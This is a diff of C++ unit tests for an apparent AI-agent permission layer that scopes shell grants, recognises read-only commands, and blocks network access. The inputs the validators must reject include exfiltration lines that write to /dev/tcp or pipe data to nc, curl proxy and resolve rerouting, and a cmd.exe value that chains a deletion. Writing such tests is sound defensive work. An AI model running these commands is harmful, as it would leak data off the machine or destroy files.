@@ -193,6 +193,13 @@ TEST(ShellCommandScopeTest, ProgramOrSubcommandOrExact) {
     EXPECT_EQ(shellCommandScope("echo $(whoami)"), "exact:echo $(whoami)");
     EXPECT_EQ(shellCommandScope("python3 -c 'import os'"), "exact:python3 -c 'import os'");
     EXPECT_EQ(shellCommandScope("FOO=1 make"), "exact:FOO=1 make");
+    // A wrapper or interpreter runs whatever it is handed, so the grant is for that line only.
+    for (const char* line : {"perl script.pl", "env rm x", "xargs rm", "sudo ls", "node build.js",
+                             "/usr/bin/ls", "./run.sh", "git -C elsewhere status", "git", "unknown-tool x"}) {
+        EXPECT_EQ(shellCommandScope(line), std::string("exact:") + line) << line;
+    }
+    EXPECT_EQ(shellCommandScope("npm test -- --watch"), "cmd:npm test");
+    EXPECT_EQ(shellCommandScope("mkdir -p out"), "cmd:mkdir");
 }
 
 TEST(ShellCommandScopeTest, AlwaysAllowCoversOnlyThatCommand) {
@@ -223,7 +230,7 @@ TEST(ShellCommandScopeTest, AlwaysAllowCoversOnlyThatCommand) {
 }
 
 TEST(ReadOnlyShellCommandTest, OnlyPlainReadersPass) {
-    for (const char* ok : {"ls -la", "dir /s /b C:\\Users\\x\\*.md", "cat a.txt | grep foo | wc -l",
+    for (const char* ok : {"ls -la", "hostname", "echo 'a & b'", "cat a.txt | grep foo | wc -l",
                            "find . -name '*.md'", "pwd; ls -la", "cd src && ls",
                            "ls cpp 2>/dev/null || echo none", "ls \"C:/Program Files\"",
                            "find . -name 'a;b'"}) {
@@ -240,17 +247,26 @@ TEST(ReadOnlyShellCommandTest, OnlyPlainReadersPass) {
                            "sort -ofile in", "uniq in out", "tree -o out", "rg --pre=sh x", "file -C -m x",
                            "git status", "git diff --output=x", "tee out", "xargs rm", "less x",
                            // Unbalanced quotes, subshells, history expansion.
-                           "ls 'x", "(rm x)", "echo !!", "ls {a,b}"}) {
+                           "ls 'x", "(rm x)", "echo !!", "ls {a,b}",
+                           // bash consumes a backslash, so the word it hides is unknown.
+                           "ls \\\"x", "dir C:\\Users\\x", "cat a\\ b",
+                           // A quoted program name, another case, a share, a write.
+                           "\"ls\" -la", "'cat' x", "LS", "ls //server/share", "cat \\\\server\\share\\x",
+                           "hostname newname", "ls 2>nul", "sort x", "awk 1 x", "sed -n p x"}) {
         EXPECT_FALSE(isReadOnlyShellCommand(no)) << no;
     }
 }
 
 TEST(ReadOnlyShellCommandTest, CmdExeTrustsOnlyBuiltins) {
     // cmd.exe runs find.bat from the current folder before the real find.
-    for (const char* ok : {"dir", "dir /s /b C:\\x", "type notes.txt", "cd src && dir", "echo hi"}) {
+    for (const char* ok : {"dir", "DIR", "dir /s /b C:\\x", "dir /s /b C:\\Users\\x\\*.md", "type notes.txt",
+                           "cd src && dir", "echo hi", "dir 2>nul"}) {
         EXPECT_TRUE(isReadOnlyShellCommand(ok, false)) << ok;
     }
-    for (const char* no : {"find \"x\" a.txt", "where python", "whoami", "tree", "ls", "git status"}) {
+    for (const char* no : {"find \"x\" a.txt", "where python", "whoami", "tree", "ls", "git status",
+                           // ' is an ordinary letter to cmd.exe, so this & really chains.
+                           "echo 'a & del x'", "dir \\\\server\\share", "dir 2>/dev/null", "echo %USERNAME%",
+                           "echo a ^& b", "\"dir\""}) {
         EXPECT_FALSE(isReadOnlyShellCommand(no, false)) << no;
     }
 }
@@ -276,14 +292,67 @@ TEST(InternetRefusalTest, RefusesWhatGoesOnline) {
                                "curl $(cat url)", "cat notes | nc host 80", "python fetch.py https://api.x.com"}) {
         EXPECT_NE(internetRefusal(sh, {{"command", online}}), "") << online;
     }
+    for (const char* rerouted : {"curl -x http://proxy:8080 http://localhost/x",
+                                 "curl --resolve localhost:80:203.0.113.5 http://localhost/",
+                                 "curl --connect-to localhost:80:example.com:80 http://localhost/",
+                                 "https_proxy=http://proxy:8080 curl http://localhost/", "nslookup example.com",
+                                 "cat notes > /dev/tcp/203.0.113.5/80", "python -c \"import socket\"",
+                                 "node -e \"fetch('x')\"", "socat - TCP:host:80"}) {
+        EXPECT_NE(internetRefusal(sh, {{"command", rerouted}}), "") << rerouted;
+    }
     for (const char* local : {"ls -la", "git status", "curl http://localhost:13305/api/v1/health",
-                              "python build.py"}) {
+                              "python build.py", "python -m pytest tests", "node build.js"}) {
         EXPECT_EQ(internetRefusal(sh, {{"command", local}}), "") << local;
     }
 
     ToolInfo write;
     write.name = "file_write";
     EXPECT_EQ(internetRefusal(write, {{"path", "README.md"}, {"content", "see https://example.com"}}), "");
+}
+
+TEST(SplitShellCommandTest, SegmentsAndWords) {
+    std::vector<std::vector<std::string>> s;
+    ASSERT_TRUE(splitShellCommand("cd src && cat 'a b.txt' | wc -l; ls", true, s));
+    ASSERT_EQ(s.size(), 4u);
+    EXPECT_EQ(s[0], (std::vector<std::string>{"cd", "src"}));
+    EXPECT_EQ(s[1], (std::vector<std::string>{"cat", "a b.txt"}));
+    EXPECT_EQ(s[3], (std::vector<std::string>{"ls"}));
+    ASSERT_TRUE(splitShellCommand("type it's.txt", false, s)) << "one quote character under cmd.exe";
+    EXPECT_EQ(s[0], (std::vector<std::string>{"type", "it's.txt"}));
+    for (const char* no : {"ls > out", "ls &", "echo $X", "echo `x`", "ls \"x", "", "ls |", "a\nb"}) {
+        EXPECT_FALSE(splitShellCommand(no, true, s)) << no;
+    }
+}
+
+TEST(AllowedToolsStoreHomeTest, NoHomeIsAnErrorNotASharedFolder) {
+#ifdef _WIN32
+    const char* name = "USERPROFILE";
+#else
+    const char* name = "HOME";
+#endif
+    const char* was = std::getenv(name);
+    const std::string saved = was ? was : "";
+#ifdef _WIN32
+    _putenv_s(name, "");
+#else
+    unsetenv(name);
+#endif
+    EXPECT_THROW(AllowedToolsStore{}, std::runtime_error);
+#ifdef _WIN32
+    _putenv_s(name, saved.c_str());
+#else
+    if (was) setenv(name, saved.c_str(), 1);
+#endif
+}
+
+TEST_F(AllowedToolsStoreTest, SaveLeavesNoTemporaryFile) {
+    store->addAlwaysAllowed("file_write");
+    size_t files = 0;
+    for (const auto& e : std::filesystem::directory_iterator(storeDir)) {
+        ++files;
+        EXPECT_EQ(e.path().extension(), ".json") << e.path();
+    }
+    EXPECT_EQ(files, 1u);
 }
 
 TEST(ReadOnlyShellCommandTest, NeedsConfirmSkipsTheQuestion) {
